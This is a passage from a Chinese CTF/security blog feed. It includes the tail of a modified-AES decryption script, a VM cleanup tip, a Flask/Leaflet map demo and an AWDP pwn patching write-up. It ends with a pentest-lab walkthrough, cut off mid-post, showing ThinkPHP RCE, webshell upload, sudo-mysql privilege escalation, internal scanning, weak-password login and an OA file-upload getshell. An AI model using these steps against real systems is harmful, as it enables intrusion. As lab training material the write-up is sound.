<span class="hljs-number">0x51</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD2</span>,<br>             <span class="hljs-number">0x96</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xBF</span>,<br>             <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x8A</span>,<br>             <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xBE</span>,<br>             <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x99</span>,<br>             <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFD</span>]<br><br><span class="hljs-comment"># 构造逆 S-box</span><br>new_contrary_sbox = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    val = new_s_box[i]<br>    new_contrary_sbox[val] = i<br><br><span class="hljs-comment"># 替换 key</span><br>Cipher_Key = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0xed</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x0a</span>,<br>    <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xb7</span>,<br>    <span class="hljs-number">0x74</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xd4</span><br>])<br><br><span class="hljs-comment"># 解密</span><br>aes = IAES()<br>plaintext = aes.IAES(cipher_bytes, Cipher_Key, new_contrary_sbox)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;📝 明文文本：&quot;</span>, plaintext.decode(<span class="hljs-string">&quot;utf-8&quot;</span>, errors=<span class="hljs-string">&quot;replace&quot;</span>))<br><br><span class="hljs-comment">#3a7e1d9c0b8f4e56</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>app逆向</tag>
      
      <tag>aes魔改</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>减少虚拟机占的物理内存</title>
    <link href="/2025/03/25/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8D%A0%E7%9A%84%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98/"/>
    <url>/2025/03/25/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8D%A0%E7%9A%84%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<h1 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h1><h2 id="drag-and-drop"><a href="#drag-and-drop" class="headerlink" title="drag_and_drop"></a>drag_and_drop</h2><p>主机和虚拟机之间值借助vmware tools插件来进行文件复制，其工作原理是每一次复制文件，都会在~&#x2F;.cache文件夹里面生成一个同样的文件，再使用cp拷贝的方式将其拷贝到复制放置的目录中</p><p>du -sh &#x2F;home&#x2F;kali&#x2F;.cache&#x2F;vmware&#x2F;drag_and_drop：计算大小</p><p>rm -rf &#x2F;home&#x2F;kali&#x2F;.cache&#x2F;vmware&#x2F;drag_and_drop</p><h2 id="deb安装包"><a href="#deb安装包" class="headerlink" title="deb安装包"></a>deb安装包</h2><p>sudo apt-get install 命令安装软件包后，安装包在 &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives 目录下</p><p>du -sh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives</p><p>sudo apt-get clean</p><p>sudo apt-get autoclean</p><h1 id="压缩虚拟机"><a href="#压缩虚拟机" class="headerlink" title="压缩虚拟机"></a>压缩虚拟机</h1><p>下面方法可以大幅减少虚拟机所占物理内存</p><p><a href="https://blog.csdn.net/feidrang/article/details/127490921">https://blog.csdn.net/feidrang/article/details/127490921</a></p><p>有个问题是在虚拟机里面删除docker或者文件并不会减少虚拟机占的物理内存，因此需要压缩虚拟机来重新释放内存，但是压缩之前需要删除全部快照，所以建议提前备份虚拟机</p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于Leaflet框架的在线地图</title>
    <link href="/2025/03/21/%E5%9F%BA%E4%BA%8ELeaflet%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%9C%B0%E5%9B%BE/"/>
    <url>/2025/03/21/%E5%9F%BA%E4%BA%8ELeaflet%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%9C%B0%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p>昨晚和高中同学聊起web端地图，于是突发奇想借助ai和框架做一个简易的系统，以此证实如今ai的强大</p><p>项目结构如下</p><img src="/2025/03/21/%E5%9F%BA%E4%BA%8ELeaflet%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%9C%B0%E5%9B%BE/1742556436163-1171a43c-d771-4f7b-b6bc-c681cb2b8e72.png" class="" title="img"><p>app.py用最典型的Flask框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, jsonify<br><br>app = Flask(__name__)<br><br>mock_data = [<br>    &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;标注点 A&quot;</span>,<br>        <span class="hljs-string">&quot;lat&quot;</span>: <span class="hljs-number">39.9042</span>,   <span class="hljs-comment"># 北京示例坐标</span><br>        <span class="hljs-string">&quot;lng&quot;</span>: <span class="hljs-number">116.4074</span><br>    &#125;,<br>    &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;标注点 B&quot;</span>,<br>        <span class="hljs-string">&quot;lat&quot;</span>: <span class="hljs-number">31.2304</span>,   <span class="hljs-comment"># 上海示例坐标</span><br>        <span class="hljs-string">&quot;lng&quot;</span>: <span class="hljs-number">121.4737</span><br>    &#125;<br>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;返回主页面&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/locations&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_locations</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;返回地理数据（JSON）&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> jsonify(mock_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>直接用Leaflet 资源的话会显示integrity校验失败，于是不使用 integrity等属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>地图演示页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 引入 Leaflet CSS (不使用 integrity 和 crossorigin 属性) --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span></span><br><span class="hljs-tag">      <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://unpkg.com/leaflet@1.9.3/dist/leaflet.css&quot;</span></span><br><span class="hljs-tag">      /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;style.css&#x27;) &#125;&#125;&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>地图演示页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;map-section&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 地图容器 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;map&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>© 2025 地图演示<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 引入 Leaflet JS (不使用 integrity 和 crossorigin 属性) --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span></span><br><span class="hljs-tag">      <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/leaflet@1.9.3/dist/leaflet.js&quot;</span></span><br><span class="hljs-tag">      &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 引入主逻辑脚本 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;main.js&#x27;) &#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>const map = L.map(&#x27;map&#x27;).setView([34, 108], 5);<br><br>// 设置 OpenStreetMap 瓦片层<br>L.tileLayer(&#x27;https://&#123;s&#125;.tile.openstreetmap.org/&#123;z&#125;/&#123;x&#125;/&#123;y&#125;.png&#x27;, &#123;<br>  attribution: &#x27;© OpenStreetMap&#x27;,<br>  maxZoom: 19,<br>&#125;).addTo(map);<br><br>// 从后端获取地理数据<br>fetch(&#x27;/api/locations&#x27;)<br>  .then(response =&gt; response.json())<br>  .then(data =&gt; &#123;<br>    data.forEach(item =&gt; &#123;<br>      // 为每个地点添加一个标注点<br>      const marker = L.marker([item.lat, item.lng]).addTo(map);<br>      // 为标注点添加弹出框显示名称和坐标<br>      marker.bindPopup(`<span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>$&#123;item.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>坐标: $&#123;item.lat&#125;, $&#123;item.lng&#125;`);<br>    &#125;);<br>  &#125;)<br>  .catch(error =&gt; &#123;<br>    console.error(&quot;获取标注点数据失败:&quot;, error);<br>  &#125;);<br>body &#123;<br>  margin: 0;<br>  padding: 0;<br>  font-family: &quot;Microsoft YaHei&quot;, Arial, sans-serif;<br>  background-color: #fafafa;<br>&#125;<br><br>header, footer &#123;<br>  text-align: center;<br>  background-color: #333;<br>  color: #fff;<br>  padding: 12px 0;<br>&#125;<br><br>h1 &#123;<br>  margin: 0;<br>  font-size: 24px;<br>&#125;<br><br>/* 地图所在容器 */<br>#map-section &#123;<br>  width: 100%;<br>  height: calc(100vh - 120px); /* 除去 header/footer 的高度 */<br>  position: relative;<br>&#125;<br><br>/* Leaflet 地图必须显式设置高度才能显示 */<br>#map &#123;<br>  width: 100%;<br>  height: 100%;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终效果</p><img src="/2025/03/21/%E5%9F%BA%E4%BA%8ELeaflet%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%9C%B0%E5%9B%BE/1742556736492-e2d43f08-2021-41e0-807a-c2d3821d5cf8.png" class="" title="img"><p>在大模型普及的今天，原来可能需要几天的时间来学习开发相关知识，现在只需要半小时就能完成基础开发，实在令人震惊。大模型在带给我们诸多便利的同时也给我带来一些思考：应该如何抵御ai浪潮的冲击，找到自己较为满意的工作？目前看来辩证看待ai给出的结果和持续学习应该是不错的选择，加油吧少年</p>]]></content>
    
    
    <categories>
      
      <category>作业与项目总结</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025ciscn&amp;ccb浙江赛区半决赛</title>
    <link href="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>今年赛题强度很高，web一道fix二十多解，其他题attack和fix应该都是个位数解；pwn一道fix60解，一道30解，还有两道个位数解。渗透队友还是很强的，最后喜提二等安慰奖</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>pwn的附件有一道是web-pwn，不知道二进制文件在哪，其他题目也不是uaf，格式化字符串漏洞等明显的漏洞，我就fix了两道，30解的题10次用完也没fix出来</p><h2 id="Quantum"><a href="#Quantum" class="headerlink" title="Quantum"></a>Quantum</h2><p>这里有格式化字符串漏洞但是没用</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742124596790-9c94d027-9cb5-46ab-9afc-cc9dab5d0ce7.png" class="" title="img"><p>把0x20改成8</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742124600547-4d808d3d-ad60-4531-a5df-947c760e87c4.png" class="" title="img"><p>然后把free下面的一行nop掉</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742124605846-d3859971-bb04-412d-aee1-b5c38094d811.png" class="" title="img"><p>没想到这题这么好防，还是防慢了</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742124612247-21474968-e066-4aa5-b7a9-d2d184ec0246.png" class="" title="img"><h2 id="Prompt"><a href="#Prompt" class="headerlink" title="Prompt"></a>Prompt</h2><p>把0x500改成0x100，这样就限制了large bin之类的</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125325929-8dfa2f72-8bec-434b-84a6-c885bb4ce699.png" class="" title="img"><p>把free下面一行（可能的offbyone nop）掉</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125329668-a8ad1c3e-7b64-4dc1-a46e-36638a60edef.png" class="" title="img"><p>把0x1000改成0x100</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125334668-cd321d24-fec3-4875-850e-ca898f60e006.png" class="" title="img"><p>修了半天才修出来，之前感觉也是这样的思路，大概率是第一眼没看到熟悉的漏洞就懵逼了</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125340813-3e40145f-f24a-4ce6-82f3-1759dd2eecb6.png" class="" title="img"><h2 id="Typo-2"><a href="#Typo-2" class="headerlink" title="Typo-2"></a>Typo-2</h2><p>尝试把+8改成+0，0x200改成0x120，显示利用失败，改成0x80或者0x78好像过度防御了</p><img src="/2025/03/16/2025ciscn-ccb%E6%B5%99%E6%B1%9F%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B/1742125127623-a44638fa-db5a-47af-9927-d027cd01841c.png" class="" title="img"><p>最后次数用完了也是没fix，呜呜不知道为啥</p>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>awdp_pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜initial wp</title>
    <link href="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/"/>
    <url>/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://exp10it.io/2023/07/chunqiuyunjing-initial-writeup/#flag01">https://exp10it.io/2023/07/chunqiuyunjing-initial-writeup/#flag01</a></p><p><a href="https://t1ng-t1ng.github.io/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/">https://t1ng-t1ng.github.io/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/</a></p><p>39.98.121.251是队友租的一个腾讯云服务器，相当于挂了一层代理</p><h1 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h1><p>入口点是172.22.1.15</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529838121-fbda0487-573c-4305-ba29-f8bfa6e2553d.png" class="" title="img"><p>fscan扫描得到常见端口，扫不出来的话再用nmap</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741513725508-711e53d4-f2d9-493f-a1e9-56df12522069.png" class="" title="img"><p>找对应的poc</p><p><a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a></p><p>修改host之后发现响应是500</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741529152731-e41719d1-4bb2-4036-ae8b-34738f6d46f6.png" class="" title="img"><p>这里没有关系继续往下</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741513839637-84367169-43bd-46ca-a47b-e08684d904b6.png" class="" title="img"><p>然后写shell.php蚁剑连接</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515629106-7a1defec-91cd-44f4-b9ed-0496988b18d1.png" class="" title="img"><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>：找到系统中所有由 root 拥有并带有 SUID 位的文件，SUID指用户在执行程序&#x2F;命令的时候，将获取文件所有者的权限，这里suid不可利用</p><p>尝试sudo提权，发现mysql有root权限</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515424108-60afdc0d-35d5-49e7-8080-d6685dcadb0c.png" class="" title="img"><p><a href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741514046470-62521c94-ec45-4483-95e1-5211072a06b2.png" class="" title="img"></p><p>这里要执行&#x2F;bin&#x2F;sh需要反弹shell，但还可以用其他命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> mysql -e <span class="hljs-string">&#x27;\! find / -name flag*&#x27;</span><br></code></pre></td></tr></table></figure><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741508248495-ca2296f4-d207-4d0b-8d16-7fce0876b3d6.png" class="" title="img"><h1 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h1><p>把fscan拖进蚁剑，再次扫描内网<code>./fscan -h 172.22.1.0/24</code></p><p>发现其他几台内网机器机器开放的端口</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509246118-492e0383-fc07-43ef-8907-0e13bcf8f9c0.png" class="" title="img"><p>整理得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">172.22.1.18 XIAORANG-OA01<br>端口: 135,80,3306,445,139<br><br>172.22.1.21 XIAORANG-WIN7<br>端口: 445,135,139<br>MS17-010永恒之蓝<br><br>172.22.1.2 DC01域控<br>端口: 135,139,445,88<br></code></pre></td></tr></table></figure><p>172.22.1.18 信呼OA</p><p>bp爆破测试出弱口令admin&#x2F;admin123</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515958369-1f71a417-af81-4bd4-b8f0-37196104ffa4.png" class="" title="img"><p>我用ProxySwitch插件一直不行，后面用的firefox自带的代理</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536551703-300e98f3-0ff2-4a91-8bf4-5847f7f606ac.png" class="" title="img"><p>成功登录</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536513259-26f61ef4-dcd9-47e9-8c9d-ce6147167217.png" class="" title="img"><p>getshell 参考 <a href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;form action=<span class="hljs-string">&quot;http://172.22.1.18/api.php?m=upload&amp;a=upfile&amp;adminid=&amp;device=1625923765752&amp;cfrom=mweb&amp;token=&amp;sysmodenum=officia&amp;sysmid=0&amp;maxsize=2&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536869961-c611d830-bccf-44f3-833e-a67ff3cbc642.png" class="" title="img"><p>拿到 id, 然后访问 <code>http://172.22.1.18/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=9</code> 生成 php</p><p>蚁剑设置代理</p><img 